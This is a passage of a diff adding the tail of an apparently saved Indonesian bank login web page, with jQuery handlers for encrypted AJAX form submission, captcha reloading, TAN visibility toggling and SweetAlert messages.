+                },
+                success: function(resp) {
+                    if (resp.ok == false) {
+                        if (resp.redirect == true) {
+                            Swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "error",
+                                allowOutsideClick: false,
+                                width: resp.width,
+                            }).then((
+                                result) => {
+                                if (result.isConfirmed) {
+                                    window.location = resp.route;
+                                }
+                            });
+                        } else {
+                            swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "error",
+                                width: resp.width,
+                            });
+                        }
+                    } else {
+                        if (resp.redirect == true) {
+                            Swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "success",
+                                allowOutsideClick: false,
+                                width: resp.width,
+                            }).then((
+                                result) => {
+                                if (result.isConfirmed) {
+                                    window.location = resp.route;
+                                }
+                            });
+                        } else {
+                            if (resp.html == null || resp.html == '') {
+                                Swal.fire({
+                                    title: resp.title,
+                                    text: resp.message,
+                                    icon: "success",
+                                    width: resp.width,
+                                });
+                            } else {
+                                swal.close();
+                                $('#main').html(resp.html);
+                            }
+                        }
+                    }
+                },
+                error: function(resp) {
+                    if (resp.status === 0) {
+                        swal.fire({
+                            title: 'ceklis',
+                            text: 'Internet Offline, periksa kembali koneksi internet anda!',
+                            icon: "error",
+                        });
+                        return false;
+                    }
+                    if (resp.redirect == true) {
+                        Swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        }).then((result) => {
+                            if (result.isConfirmed) {
+                                window.location = resp.route;
+                            }
+                        })
+                    } else {
+                        swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        });
+                    }
+                },
+                complete: function() {
+                    if (Swal.isLoading()) {
+                        Swal.close()
+                    }
+                    // $(".button-submit").attr("disabled", false);
+                    // $(".button-submit span").removeClass("las la-spinner");
+                    // if (!resp.ok) {
+                    //     swal.close();
+                    // }
+                    // Swal.hideLoading();
+                }
+            });
+        });
+
+        $("[ajax='true']").submit(function(e) {
+            e.preventDefault();
+            let routes = $(this).attr('data-routes');
+            let a = new E();
+            // var b = $(this).serializeArray().reduce(function(obj, item) {
+            //     if (item.name != "_token") {
+            // obj[item.name] = a.ec(item.value, $('meta[name="csrf-token"]').attr(
+            //     'content'));
+            //     } else {
+            //         obj[item.name] = item.value;
+            //     }
+            //     return obj;
+            // }, {});
+            var b = new FormData($(this)[0]);
+            for (let [key, value] of b.entries()) {
+                if (key == "_token" || value instanceof File) {
+                    b.set(key, value)
+                } else {
+                    b.set(key, a.ec(value, $('meta[name="csrf-token"]').attr(
+                        'content')))
+                }
+            }
+
+            $.ajax({
+                type: "POST",
+                url: host + '/' + routes,
+                data: b,
+                contentType: false,
+                processData: false,
+                dataType: 'json',
+                headers: {
+                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                },
+                beforeSend: function() {
+                    $(".button-submit").attr("disabled", true);
+                    $(".button-submit span").addClass("las la-spinner");
+                },
+                success: function(resp) {
+                    if (resp.ok == false) {
+                        if (resp.redirect == true) {
+                            Swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "error",
+                                allowOutsideClick: false,
+                                width: resp.width,
+                            }).then((
+                                result) => {
+                                if (result.isConfirmed) {
+                                    window.location = resp.route;
+                                }
+                            });
+                        } else {
+                            swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "error",
+                                width: resp.width,
+                            });
+                        }
+                    } else {
+                        if (resp.redirect == true) {
+                            Swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "success",
+                                allowOutsideClick: false,
+                                width: resp.width,
+                            }).then((
+                                result) => {
+                                if (result.isConfirmed) {
+                                    window.location = resp.route;
+                                }
+                            });
+                        } else {
+                            if (resp.html == null || resp.html == '') {
+                                Swal.fire({
+                                    title: resp.title,
+                                    text: resp.message,
+                                    icon: "success",
+                                    width: resp.width,
+                                });
+                            } else {
+                                $('#main').html(resp.html);
+                            }
+                        }
+                    }
+                },
+                error: function(resp) {
+                    if (resp.status === 0) {
+                        swal.fire({
+                            title: 'ceklis',
+                            text: 'Internet Offline, periksa kembali koneksi internet anda!',
+                            icon: "error",
+                        });
+                        return false;
+                    }
+                    if (resp.redirect == true) {
+                        Swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        }).then((result) => {
+                            if (result.isConfirmed) {
+                                window.location = resp.route;
+                            }
+                        })
+                    } else {
+                        swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        });
+                    }
+                },
+                complete: function() {
+                    $(".button-submit").attr("disabled", false);
+                    $(".button-submit span").removeClass("las la-spinner");
+                }
+            });
+        });
+
+
+        $("#ajax-form-check").submit(function(e) {
+            e.preventDefault();
+            if (navigator.onLine) {
+                let routes = $(this).attr('data-routes');
+                let a = new E();
+
+                var b = new FormData($(this)[0]);
+                for (let [key, value] of b.entries()) {
+                    if (key == "_token" || value instanceof File) {
+                        b.set(key, value)
+                    } else {
+                        b.set(key, a.ec(value, $('meta[name="csrf-token"]').attr(
+                            'content')))
+                    }
+                }
+
+                $.ajax({
+                    type: "POST",
+                    url: host + '/' + routes,
+                    data: b,
+                    contentType: false,
+                    processData: false,
+                    dataType: 'json',
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                    },
+                    beforeSend: function() {
+                        $(".button-submit").attr("disabled", true);
+                        $(".button-submit span").addClass("las la-spinner");
+                    },
+                    success: function(resp) {
+                        if (resp.ok == false) {
+                            if (resp.redirect == true) {
+                                Swal.fire("ceklis", resp.message, "berhasil").then((
+                                    result) => {
+                                    if (result.isConfirmed) {
+                                        window.location = resp.route;
+                                    }
+                                });
+                            } else {
+                                swal.fire("Peringatan", resp.message, "error");
+                            }
+                        } else {
+                            if (resp.redirect == true) {
+                                Swal.fire("Success", resp.message, "success").then((
+                                    result) => {
+                                    if (result.isConfirmed) {
+                                        window.location = resp.route;
+                                    }
+                                });
+                            } else {
+                                if (resp.html == null || resp.html == '') {
+                                    Swal.fire("Success", resp.message, "success");
+                                } else {
+                                    $('#main').html(resp.html);
+                                }
+                            }
+                        }
+                    },
+                    error: function(resp) {
+                        if (resp.redirect == true) {
+                            Swal.fire("Peringatan", resp.message, "error").then((
+                                result) => {
+                                if (result.isConfirmed) {
+                                    window.location = resp.route;
+                                }
+                            })
+                        } else {
+                            swal.fire("Peringatan", resp.message, "error");
+                        }
+                    },
+                    complete: function() {
+                        $(".button-submit").attr("disabled", false);
+                        $(".button-submit span").removeClass("las la-spinner");
+                    }
+                });
+            } else {
+                swal.fire("Peringatan", "Koneksi Terputus", "error");
+            }
+        });
+
+
+        $("#ajax-form-upload").submit(function(e) {
+            e.preventDefault();
+            let routes = $(this).attr('data-routes');
+            let a = new E();
+            var b = $(this).serializeArray().reduce(function(obj, item) {
+                if (item.name != "_token") {
+                    obj[item.name] = a.ec(item.value, $('meta[name="csrf-token"]').attr(
+                        'content'));
+                } else {
+                    obj[item.name] = item.value;
+                }
+                return obj;
+            }, {});
+
+            var formData = new FormData($(this)[0]);
+            for (let [key, value] of formData.entries()) {
+                if (value instanceof File) {
+                    console.log(`${key}: ${value}`);
+                }
+            }
+        });
+
+        $("#login-form").submit(function(e) {
+            e.preventDefault();
+            let routes = $(this).attr('data-routes');
+            let a = new E();
+
+            var b = new FormData($(this)[0]);
+            for (let [key, value] of b.entries()) {
+                if (key == "_token" || value instanceof File) {
+                    b.set(key, value)
+                } else {
+                    b.set(key, a.ec(value, $('meta[name="csrf-token"]').attr(
+                        'content')))
+                }
+            }
+
+            $.ajax({
+                type: "POST",
+                url: host + '/' + routes,
+                data: b,
+                contentType: false,
+                processData: false,
+                dataType: 'json',
+                headers: {
+                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                },
+                beforeSend: function() {
+                    $(".btn-login").attr("disabled", true);
+                    $(".btn-login i").removeClass("la la-angle-right");
+                    $(".btn-login i").addClass("las la-spinner");
+                },
+                success: function(resp) {
+                    if (resp.ok == false) {
+                        reloadCaptcha();
+                        if (resp.redirect == true) {
+                            if (resp.data.rc == '131') {
+                                Swal.fire({
+                                    title: resp.title,
+                                    text: resp.message,
+                                    icon: "error",
+                                    allowOutsideClick: false,
+                                    width: resp.width,
+                                    showDenyButton: true,
+                                    confirmButtonText: 'Ya',
+                                    denyButtonText: 'Tidak',
+                                    reverseButtons: true
+                                }).then((
+                                    result) => {
+                                    if (result.isConfirmed) {
+                                        window.location = resp.route;
+                                    }
+                                });
+                            } else if (resp.data.rc == '146') {
+                                Swal.fire({
+                                    title: resp.title,
+                                    html: resp.message,
+                                    icon: "warning",
+                                    width: resp.width,
+                                    showCancelButton: false,
+                                    showConfirmButton: false
+                                });
+                            } else {
+                                Swal.fire({
+                                    title: resp.title,
+                                    text: resp.message,
+                                    icon: "error",
+                                    allowOutsideClick: false,
+                                    width: resp.width,
+                                }).then((
+                                    result) => {
+                                    if (result.isConfirmed) {
+                                        window.location = resp.route;
+                                    }
+                                });
+                            }
+                        } else {
+                            swal.fire({
+                                title: resp.title,
+                                text: resp.message,
+                                icon: "error",
+                                width: resp.width,
+                            });
+                        }
+                    } else {
+                        reloadCaptcha();
+                        if (resp.redirect == true) {
+                            window.location = resp.route;
+                        } else {
+                            if (resp.html == null || resp.html == '') {
+                                Swal.fire({
+                                    title: resp.title,
+                                    text: resp.message,
+                                    icon: "success",
+                                    width: resp.width,
+                                });
+                            } else {
+                                $('#main').html(resp.html);
+                            }
+                        }
+                    }
+                },
+                error: function(resp) {
+                    if (resp.status === 0) {
+                        swal.fire({
+                            title: '',
+                            text: 'Silahkan Request Token untuk melanjutkam',
+                            icon: "success",
+                        });
+                        return false;
+                    }
+
+                    if (resp.redirect == true) {
+                        Swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        }).then((result) => {
+                            if (result.isConfirmed) {
+                                window.location = resp.route;
+                            }
+                        })
+                    } else {
+                        swal.fire({
+                            title: resp.title,
+                            text: resp.message,
+                            icon: "error",
+                            width: resp.width,
+                        });
+                    }
+                },
+                complete: function() {
+                    $(".btn-login").attr("disabled", false);
+                    $(".btn-login i").removeClass("las la-spinner");
+                    $(".btn-login i").addClass("la la-angle-right");
+                }
+            });
+        });
+
+        function reloadCaptcha() {
+            var host = "https://bsinet.bankbsi.co.id";
+            $.ajax({
+                type: 'GET',
+                url: host + '/reloadCaptcha',
+                success: function(data) {
+                    $('#captcha-img').attr('src', data.captcha);
+                    $("#captcha").val('')
+                }
+            });
+        }
+
+        $(document).on("input", ".only-number", function() {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        $(document).on("click", "#toggleTan", function() {
+            const tan = document.querySelector('#tan');
+            const type = tan.getAttribute('type') === 'password' ? 'text' : 'password';
+            tan.setAttribute('type', type);
+
+            this.classList.toggle('la-eye-slash');
+        });
+    });
+
+    function addCommas(nStr) {
+        nStr += '';
+        x = nStr.split('.');
+        x1 = x[0];
+        x2 = x.length > 1 ? '.' + x[1] : '';
+        var rgx = /(\d+)(\d{3})/;
+        while (rgx.test(x1)) {
+            x1 = x1.replace(rgx, '$1' + ',' + '$2');
+        }
+        return x1 + x2;
+    }
+
+    function onlyNumberKey(evt) {
+        var ASCIICode = (evt.which) ? evt.which : evt.keyCode
+        if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
+            return false;
+        return true;
+    }
+
+    function isJsonString(str) {
+        try {
+            JSON.parse(str)
+        } catch (e) {
+            return false
+        }
+        return true
+    }
+</script>
+    <script src="https://bsinet.bankbsi.co.id/vendor/sweetalert/sweetalert.all.js"></script>
+
+<script type="text/javascript" src="https://bsinet.bankbsi.co.id/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=1&cb=492493458" async></script></body>
+
+</html>
